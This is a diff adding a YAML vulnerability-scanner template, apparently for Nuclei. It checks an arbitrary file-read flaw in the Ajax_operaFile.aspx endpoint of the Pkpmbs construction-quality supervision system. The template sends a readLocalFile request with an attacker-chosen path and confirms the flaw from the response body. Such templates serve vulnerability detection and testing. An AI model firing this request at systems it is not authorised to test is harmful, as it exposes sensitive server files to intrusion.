@@ -1,0 +1,19 @@
+id: pkpmbs-operaFile-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: Pkpmbs建设工程质量监督系统Ajax_operaFile.aspx接口处存在文件读取漏洞，恶意攻击者可能会利用此漏洞读取敏感文件，对系统造成危害
+  reference:
+    - https://github.com/wudijun/Catcher/blob/d54daa732c892c197635c22fed1daa44586b0a86/poc/pkpmbs%E5%BB%BA%E8%AE%BE%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F%E7%9B%91%E7%9D%A3%E7%B3%BB%E7%BB%9F/pkpmbs%E5%BB%BA%E8%AE%BE%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F%E7%9B%91%E7%9D%A3%E7%B3%BB%E7%BB%9F%20Ajax_operaFile.aspx%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.yaml#L11
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Applications/BaseInfos/System/Ajax_operaFile.aspx?method=readLocalFile&path=/Applications/BaseInfos/System/Ajax_operaFile.aspx"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Applications'
